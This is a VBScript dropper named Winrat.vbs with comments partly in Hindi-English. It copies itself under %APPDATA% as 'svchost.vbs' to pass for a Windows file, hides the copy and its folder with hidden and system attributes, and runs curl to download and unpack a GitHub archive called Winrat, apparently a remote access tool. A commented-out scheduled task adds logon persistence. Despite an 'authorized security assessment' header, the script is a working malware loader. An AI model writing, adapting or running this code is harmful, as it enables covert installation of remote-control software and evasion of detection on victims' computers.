' Winrat.vbs - Deploys to a hard-to-find location
' Authorized security assessment use only

Dim fso, wshShell, scriptPath, destPath, scriptName

Set fso = CreateObject("Scripting.FileSystemObject")
Set wshShell = CreateObject("WScript.Shell")

' Current script ka path
scriptPath = WScript.ScriptFullName
scriptName = "svchost.vbs"  ' Innocuous name

' === Option 1: %AppData%\Microsoft\ (looks like Windows system directory) ===
destPath = wshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Caches\" & scriptName

' === Option 2: %ProgramData% (hidden by default, no user easily browses here) ===
' destPath = wshShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\Microsoft\DeviceSync\" & scriptName

' === Option 3: %LocalAppData%\Temp\ with hidden + system attributes ===
' destPath = wshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Temp\com\svchost.vbs"

' Copy current script to target location
If Not fso.FileExists(destPath) Then
    fso.CopyFile scriptPath, destPath, True
    
    ' Hide the file using attrib (hidden + system)
    wshShell.Run "cmd.exe /c attrib +h +s """ & destPath & """", 0, True
    
    ' Hide the parent folder as well
    parentFolder = fso.GetParentFolderName(destPath)
    wshShell.Run "cmd.exe /c attrib +h """ & parentFolder & """", 0, True
End If

' Now wait 3 seconds and execute the main payload
WScript.Sleep 3000

' Run cmd with color b and download/extract GitHub repo
Dim strCmd
strCmd = "cmd.exe /k color b && cd %temp% && echo [!] Downloading... && curl -L -o winrat.zip ""https://github.com/khulasaai/Winrat/archive/refs/heads/main.zip"" && powershell -Command ""Expand-Archive -Path winrat.zip -DestinationPath . -Force"" && echo [!] Done. Files in %temp%\Winrat-main && dir Winrat-main"

wshShell.Run strCmd, 1, False

' Create a scheduled task for persistence (optional, comment out if not needed)
' wshShell.Run "schtasks /create /tn ""WindowsCacheUpdate"" /tr """ & destPath & """ /sc onlogon /f", 0, False
